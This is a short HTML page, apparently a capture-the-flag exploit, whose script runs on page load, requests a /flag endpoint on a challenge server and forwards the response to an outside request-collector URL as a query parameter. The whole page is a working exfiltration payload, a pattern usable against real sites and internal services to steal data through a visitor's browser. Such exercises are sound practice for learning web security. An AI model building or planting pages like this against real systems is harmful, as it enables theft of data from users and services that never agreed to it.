<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flag Sender3</title>
</head>
<body>
    <h1>Flag Sender</h1>
    <script>
        const sendFlag = () => {
            const requestUrl = 'http://war.sschall.xyz:60001/flag';
            const xhr = new XMLHttpRequest();

            xhr.open('GET', requestUrl, true);
            xhr.onload = function () {
                if (xhr.status >= 200 && xhr.status < 300) {
                    const responseText = xhr.responseText;

                    console.log(`Requesting: ${requestUrl}`); // 요청 로그
                    console.log(`Response: ${responseText}`); // 응답 로그

                    // 최종 요청 보내기 (응답 text를 파라미터로 사용)
                    const finalRequestUrl = `https://ioegaam.request.dreamhack.games?flag=${encodeURIComponent(responseText)}`;
                    fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄

                    console.log('Final FLAG sent:', responseText);
                } else {
                    console.error('Request failed:', xhr.statusText);
                }
            };

            xhr.onerror = function () {
                console.error('Network error');
            };

            xhr.send();
        };

        sendFlag();
    </script>
</body>
</html>
